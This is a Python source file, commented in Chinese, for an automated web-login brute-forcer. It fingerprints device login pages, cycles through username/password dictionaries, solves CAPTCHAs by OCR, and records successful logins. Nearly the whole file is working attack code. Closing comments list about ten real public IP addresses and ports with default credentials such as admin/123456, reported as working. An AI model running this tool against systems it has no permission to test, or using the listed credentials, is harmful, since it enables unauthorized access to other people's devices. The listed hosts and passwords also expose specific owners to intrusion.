#!coding=u8
#========== import区 全局变量区==========
import asyncio, json
import contextlib
from base64 import b64decode
from datetime import datetime, timedelta
from os import linesep
from sys import exit, stdout
from time import sleep


import ddddocr
import webpass_config as glob
from fire import Fire
from loguru import logger
from playwright._impl._api_types import Error, TimeoutError
from playwright.async_api import (Playwright, PlaywrightContextManager,
                                  async_playwright)
from urllib3 import disable_warnings
from webpass_func import *

disable_warnings()
import nest_asyncio
nest_asyncio.apply()    # 主要解决循环体的嵌套事件, 没有这个语句会报错: This event loop is already running
#========== 数据结构 过程函数 ==========


def launch(u = '', f = '', debug = False, gen = False, wait = 3, process = 8,just_discern = True):
    '''
    -u: url
    -f: file
    -g: 配置模式
    -w: 单目标等待时间, 分钟
    -j: 只探测识别到的目标
    '''
    if gen: gen_code(gen); exit(0)
    
    target_str = u
    if f: target_str = f"{target_str}\n{read_fileA(f, 'str')}"
    target_dict = get_url(target_str)
    if not target_dict: exit('type -h for help');                          # 没有目标
    
    logger.remove()
    logger.add(stdout, level='DEBUG' if debug else 'INFO')
    logger.add(glob.cfg.err_log_file, level="ERROR")
    
    set_value('wait', wait)
    set_value('debug', debug)
    set_value('process', process)
    set_value('just_discern', just_discern)
    set_value('target_dict', target_dict)
    logger.info(f"目标总数 => {len(target_dict)}")
    logger.debug(f"所有配置 => \n|{json.dumps(get_all_value(), indent=4, ensure_ascii=0)[:200]}...|")
    goA(write_print_info_loop, nowait = 1)
    # goA(asyncio.run(back_run()))
    asyncio.run(main(target_dict))
    
def count_status(filter_list: list):
    target_dict = get_value('target_dict')
    filter_count = [0] * len(filter_list)
    for url, value in target_dict.items():
        for i in range(len(filter_list)):
            if value['status'] == filter_list[i]: filter_count[i] += 1
    return filter_count

async def back_run():
    try:
        if glob.task_list:
            glob.all_status = count_status(['init', 'identify', 'tasking', 'wait', 'done', 'success'])
            logger.warning(f'当前状态: init = {glob.all_status[0]}, identify = {glob.all_status[1]}, tasking = {glob.all_status[2]}, wait = {glob.all_status[3]}, done = {glob.all_status[4]}, success = {glob.all_status[5]}')
            local_task_list = []
            local_task_list.extend(glob.task_list)
            glob.task_list.clear()
            await asyncio.wait(local_task_list, timeout=None)
    except Exception:
        logger.error(get_err_msg())


async def main(target_dict):
    # sourcery skip: remove-unnecessary-else, swap-if-else-branches
    process = get_value('process', 8)
    try:
        # 获取IP列表+端口，根据厂商区分？或者混排
        async with async_playwright() as ap:
            t = [asyncio.create_task(create_browser_loop(None, ap))]
            await asyncio.wait(t, timeout=None)
            
            url_list = list(target_dict.keys()); n = 0
            while True:
                if glob.pQu.empty(): asyncio.sleep(0.1); continue
                x = glob.all_status
                url = url_list[n]
                if n + 1 == len(url_list): 
                    n = 0
                    goA(await back_run())
                    if sum(x[:4]) == 0: break
                else: 
                    n += 1
                    if len(glob.task_list) > process * 3: goA(await back_run())
                
                if x[5]: logger.warning(f'等待中的任务数: {x[5]}')
                if not need_goto(None, url): continue
                t = asyncio.create_task(manage_pages(None, url))
                glob.task_list.append(t)
                logger.debug(f"{get_call_link(1)} 添加任务")
            write_queue()

    except KeyboardInterrupt: kill_myself(1)
    except Exception as e:
        logger.error(get_err_msg())
        return False,e

def gen_code(url):
    from subprocess import Popen
    print(f'python -m playwright codegen --ignore-https-errors -b wk {url}')
    Popen(f'python -m playwright codegen --ignore-https-errors -b wk {url}')



def write_print_info_loop(sema  = None):
    change_dir_txt_code(glob.cfg.pass_dict_dir, 'utf-8')
    logger.debug("已转换字典编码")
    while True:
        try:
            sleep(60)
            print_result()
            write_queue()
        except KeyboardInterrupt: kill_myself(1)
        except Exception as e:
            err_msg = get_err_msg(); logger.error(err_msg); continue

def print_result():
    url_list = get_value('target_dict')
    font_color = Fore.LIGHTYELLOW_EX
    cprint(f"\n{'='*50}", f=font_color)
    cprint(f"目标可识别: {glob.identifyInt}/{len(url_list)}, {glob.identifyInt/len(url_list):0.2%}, 未识别地址：{len(url_list) - glob.identifyInt}", f=font_color)
    cprint(f'剩余任务数: {glob.taskQu.qsize()}, 任务总数: {glob.taskcountInt}', f=font_color)
    cprint(f"成功数量: {glob.suc_login_Qu.qsize()}", f=font_color)
    cprint(f"失败或异常数量: {glob.fail_login_Qu.qsize() + glob.check_login_Qu.qsize() + glob.timeoutQu.qsize()}", f=font_color)
    cprint('='*50, f=font_color)


def print_target_dict():
    target_dict = get_value('target_dict')
    for url, value in target_dict.items():
        print(url, value['status'], value['title'], value['key'])

    

def write_queue():
    write_file(glob.cfg.unknown_device_file, glob.unknownQu.queue, 'w')
    write_file(glob.cfg.suc_login_file, glob.suc_login_Qu.queue, 'w')
    write_file(glob.cfg.fail_login_file, glob.fail_login_Qu.queue, 'w')
    write_file(glob.cfg.watch_file, glob.check_login_Qu.queue, 'w')
    glob.all_status = count_status(['init', 'identify', 'tasking', 'wait', 'done', 'success'])
    logger.warning(f'当前状态: init = {glob.all_status[0]}, identify = {glob.all_status[1]}, tasking = {glob.all_status[2]}, wait = {glob.all_status[3]}, done = {glob.all_status[4]}, success = {glob.all_status[5]}')
    logger.debug("已记录任务结果队列")



async def create_browser_loop(sema  = None, ap = None):
    try:
        process = get_value('process', 8)
        glob.ocr = ddddocr.DdddOcr(old=True, show_ad=False)
        # 创建指定数量的浏览器页面
        browser = await ap.chromium.launch(headless=not get_value('debug', False), timeout=10 * 1000)

        context = await browser.new_context(ignore_https_errors=True)
        for _ in range(process):
            page = await context.new_page()
            await glob.pQu.put(page)
        logger.debug(f"浏览器已创建页面总数:{glob.pQu.qsize()}")
        
    except KeyboardInterrupt: kill_myself(1)
    except Exception:
        err_msg = get_err_msg()
        logger.error(err_msg)
        return err_msg

def need_goto(sema, url):
    goto_status_list = ['init', 'identify', 'tasking']
    target = get_value('target_dict')[url]
    wait = get_value('wait', 5)

    if not target['last_time']: target['last_time'] = datetime.now() - timedelta(minutes = wait + 1)
    if not target['user_pass']: target['user_pass'] = asyncio.Queue()
    if target['status'] in ['wait'] and \
        more_than_minutes(target['last_time'], wait):
        target['status'] = 'tasking'
        
    if not get_value('just_discern'): goto_status_list.append('unknown')

    if target['status'] in goto_status_list: return True
    else: return False

async def manage_pages(sema, url):  # sourcery skip: switch
    try:
        target = get_value('target_dict')[url]
        url_status = target['status']

        page = await glob.pQu.get()
        await page.goto(url)
        await page.wait_for_load_state('networkidle')
        logger.info(f"GET一个空闲页处理: [{url_status:^8}] {url}")
        
        if url_status in ['init']:
            await identify_url(None, page, url)
            await create_task(None, page, url)
            await do_brute(None, page, url)
        if url_status in ['identify', 'unknown']:
            await create_task(None, page, url)
        if url_status in ['tasking']:
            await do_brute(None, page, url)
        if url_status in ['done']:
            print('.')
    
    except KeyboardInterrupt: kill_myself(1)
    except (TimeoutError, Error) as e:
        target['status'] = 'timeout'
        err_msg = f'连接超时: {url}'; logger.error(err_msg); return err_msg, 0
    except Exception as e:
        target['status'] = 'error'
        err_msg = get_err_msg(); logger.error(err_msg); return err_msg, 0
    finally:
        if page: await glob.pQu.put(page)





async def do_brute(sema, page, url):
    try:
        target = get_value('target_dict')[url]
        user_pass_count = target['user_pass'].qsize()
        logger.debug(f"{get_call_link(1)}执行爆破 [{url}], 密码对数:{user_pass_count}")
        
        success = ''
        for _ in range(min(user_pass_count, 3)):
            err, old_content, new_content, equal_rate, usernm, passwd = await fill_input(None, page, url, target)
            if err in ['done', 'success']: break
            logger.debug(f"错误码: {err}, 登录前长度:{len(old_content)}, 登录后长度: {len(new_content)}, 前后相似度: {equal_rate:0.2f}")
            success = judge_success(url, target, equal_rate, new_content, usernm, passwd)
        if user_pass_count:
            target['status'] = 'wait'
        else:
            target['status'] = 'done'
        target['last_time'] = datetime.now()
        return 0, url , success
        
    except (TimeoutError, Error) as e:
        err_msg = f'连接超时: {url}'
        logger.error(err_msg)
        return err_msg, url, ''
    
    except KeyboardInterrupt: kill_myself()
    except Exception:
        err_msg = get_err_msg()
        logger.error(err_msg)
        return err_msg, url, ''

async def identify_url(sema, page, url):
    try:
        logger.debug(f"{get_call_link(1)} 识别")
        target = get_value('target_dict')[url]
        target['title'] = await page.title() or ''
        target['content'] = await page.content()
        logger.debug(f"{url} => |{target['title']}|")
        err, key = search_product(target['content'])
        target['key'] = key
        logger.debug(f"{url} => |{target['key']}|")
        ret = judge_identify_result(target, err, url, key, target['title'])
        logger.debug(f"{get_call_link(1)}{url} 返回:{ret}")
        target['status'] = ret
        return err, url, key, target['title']
        
    except (TimeoutError, Error) as e:
        err_msg = f'连接超时: {url}'
        glob.timeoutQu.put(err_msg)
        logger.error(err_msg)
        target = get_value('target_dict')[url]
        target['status'] = 'timeout'
        logger.warning(f"target => |{target}| {type(target)}")
        return err_msg, url, '', target['title']
    
    except KeyboardInterrupt: kill_myself(1)
    except Exception:
        err_msg = get_err_msg()
        logger.error(err_msg)
        target = get_value('target_dict')[url]
        target['status'] = 'error'
        logger.warning(f"target => |{target}| {type(target)}")
        return err_msg, url, '', target['title']

def judge_identify_result(target, err, url, key, title):

    if not err:
        glob.identifyQu.put([url, key, title])
        glob.identifyInt += 1
        logger.success(f"已识别: {url} -> {key}: {title}")
        return 'identify'
    
    elif err in ['Unknown']: 
        glob.unknownQu.put([url, err, title])
        logger.info(f"未识别: {url} -> {key}: {title}")
        return 'unknown'

    else:
        glob.unknownQu.put([url, err, title])
        logger.error(err)
        return 'error'


async def create_task(sema, page, url):
    logger.debug(f"{get_call_link(1)} 启动任务创建线程")
    just_discern = get_value('just_discern')
    target = get_value('target_dict')[url]
    
    continue_list = ['identify']
    if not just_discern: continue_list.append('unknown')
    if target['status'] not in continue_list: return 0

    try:
        key = target['key']
        status = target['status']
        title = target['title']
        
        username_list = await aread_file(glob.cfg.pass_dict[key]['user_info'][1])
        password_list = await aread_file(glob.cfg.pass_dict[key]['pass_info'][1])

        user_pass = [[username_list[i], password_list[i]] for i in range(min(len(username_list), len(password_list)))]  # 先写一一对应的

        for _pass in password_list:     # 再添加剩余的
            for _user in username_list:
                if [_user, _pass] not in user_pass:
                    user_pass.append([_user, _pass])

        if not target['user_pass']: target['user_pass'] = asyncio.Queue()
        for usernm, passwd in user_pass:    # 开始创建任务
            glob.taskcountInt += 1
            target['last_time'] = datetime.now() - timedelta(minutes=5)
            await target['user_pass'].put([usernm, passwd])

        target['status'] = 'tasking'
        logger.info(f'创建任务: 已添加字典{len(user_pass)}条. {url}:{key}')


    except KeyboardInterrupt as e:
        kill_myself(1)

    except Exception as e:
        err_msg = get_err_msg()
        logger.error(err_msg)


        

def search_product(content):
    for key, value in glob.cfg.pass_dict.items():
        if len(value['keywords']) > 0 and len(value['keywords'][0]) > 0:
            if list_all_in_str(value['keywords'], content):return 0, key
            else: continue
        elif key in content: return 0, key
        else: continue
    return 'Unknown', 'Unknown'



async def aget_page():
    
    p = None
    while not p:
        try:
            p = glob.pQu.get_nowait()
        except asyncio.QueueEmpty as e:
            logger.debug("pQu is Empty")
            await asyncio.sleep(1)
    logger.debug(f"已获取一个页面, 剩余空闲页面数 => {glob.pQu.qsize()}")
    return p


async def fill_input(sema, page, url, target):
    try:
        if target['user_pass'].empty(): target['status'] = 'done'; return 'done', '', '', 0, '', ''
        key = target['key']
        usernm, passwd = await target['user_pass'].get()
        username_key = glob.cfg.pass_dict[key]['user_info'][0]
        password_key = glob.cfg.pass_dict[key]['pass_info'][0]
        
        logger.debug("已打开网页")
        old_content = target['content']

        logger.debug("填写账号密码")
        await page.locator(username_key).click()
        await page.locator(username_key).fill(usernm)
        await page.locator(password_key).click()
        await page.locator(password_key).fill(passwd)

        if len(glob.cfg.pass_dict[key]['CAPTCHA']) == 2:
            import aiofiles
            logger.debug("处理验证码")
            code_edit = glob.cfg.pass_dict[key]['CAPTCHA'][0]
            code_pict = glob.cfg.pass_dict[key]['CAPTCHA'][1]
            await page.click(code_edit)
            await page.locator(code_pict).screenshot(path='code.jpeg',quality=100,type='jpeg')
            async with aiofiles.open("code.jpeg", 'rb') as f:
                image = await f.read()
            res = glob.ocr.classification(image)
            await page.fill(code_edit, res)

        await page.locator(glob.cfg.pass_dict[key]['button'][0]).click()
        logger.debug("点击登录")
        await page.wait_for_load_state('domcontentloaded')
        new_content = await page.content()
        return 0, old_content, new_content, get_equal_rate(old_content, new_content), usernm, passwd
    
    except TimeoutError:
        logger.error(f"[{key}] 的配置在 [{url}] 可能有问题, 无法找到指定元素")
        return '配置有误', '', '', 0, usernm, passwd
    
    except KeyboardInterrupt: kill_myself('KeyboardInterrupt')
    except Exception:
        err_msg = get_err_msg(1)
        logger.error(f"{url} -> {err_msg[:err_msg.find(linesep)]}")
        return err_msg, '', '', 0, usernm, passwd


def login_success(url, title, _user, _pass, equal_rate):
    glob.suc_login_Qu.put([url, title, _user, _pass, f'登录成功: {equal_rate}']) # 成功
    get_value('target_dict')[url]['status'] = 'success'
    logger.success(f'{url} -> {_user} : {_pass} 登录成功: {equal_rate}')
    return True

def login_fail(url, title, _user, _pass, equal_rate):
    glob.fail_login_Qu.put([url, title, _user, _pass, f'登录失败: {equal_rate}']) # 失败
    logger.info(f'{url} -> {_user} : {_pass} 登录失败: {equal_rate}')
    return False

def login_check(url, title, _user, _pass, equal_rate):
    glob.check_login_Qu.put([url, title, _user, _pass, f'非预期值: {equal_rate}']) # 失败
    logger.info(f'{url} -> {_user} : {_pass} 非预期值: {equal_rate}')
    return False

def judge_success(url, target, equal_rate, new_content, _user, _pass):
    # sourcery skip: low-code-quality
    ''''''
    try:
        success = False
        key = target['key']
        title = target['title']
        
        if len(glob.cfg.pass_dict[key]['suc']) < 1 and len(glob.cfg.pass_dict[key]['fail']) < 1:      # 没有配置成功失败
            if 0.01 < equal_rate < 0.85:
                success = login_success(url, title, _user, _pass, equal_rate)
            else:
                success = login_fail(url, title, _user, _pass, equal_rate)

        elif len(glob.cfg.pass_dict[key]['logic']) == 1 and glob.cfg.pass_dict[key]['logic'][0] == 'or':
            if list_any_one_in_str(glob.cfg.pass_dict[key]['suc'], new_content):
                success = login_success(url, title, _user, _pass, equal_rate)
                # TODO 清理掉登录成功的

            elif list_any_one_in_str(glob.cfg.pass_dict[key]['fail'], new_content):
                success = login_fail(url, title, _user, _pass, equal_rate)
            elif 0.01 < equal_rate < 0.85:
                success = login_success(url, title, _user, _pass, equal_rate)
            else:
                success = login_check(url, title, _user, _pass, equal_rate)

        elif len(glob.cfg.pass_dict[key]['logic']) == 1 and glob.cfg.pass_dict[key]['logic'][0] == 'and':
            if list_all_in_str(glob.cfg.pass_dict[key]['suc'], new_content):
                success = login_success(url, title, _user, _pass, equal_rate)
                
            elif list_all_in_str(glob.cfg.pass_dict[key]['fail'], new_content):
                success = login_fail(url, title, _user, _pass, equal_rate)
                
            elif 0.01 < equal_rate < 0.85:
                success = login_success(url, title, _user, _pass, equal_rate)
                
            else:
                success = login_check(url, title, _user, _pass, equal_rate)
                
        return success
    
    except KeyboardInterrupt as e:
        print('KeyboardInterrupt');exit()
    
    except Exception as e:
        err_msg = get_err_msg(pl=1); logger.error(err_msg); return err_msg, 0
        


if __name__ == '__main__':
    Fire(launch)






# 这些没探测出来：

# http://80.52.143.218:1025 存在弱口令 admin --- 123456
# http://91.235.247.118:88 存在弱口令 admin --- 123456
# http://91.222.154.123:58603 存在弱口令 admin --- 123456
# http://31.169.84.106:81 存在弱口令 admin --- admin 
# http://171.6.135.220:88 存在弱口令 admin --- 123456
# http://31.169.84.106:81 存在弱口令 admin --- 888888 
# http://109.95.32.165:85 存在弱口令 admin --- 123456
# http://213.231.6.93:85 存在弱口令 admin --- 123456
# http://151.20.32.39:58585 存在弱口令 admin --- 123456
# http://80.52.143.218:1025 存在弱口令 admin --- 123456
# http://91.235.247.118:88 存在弱口令 admin --- 123456

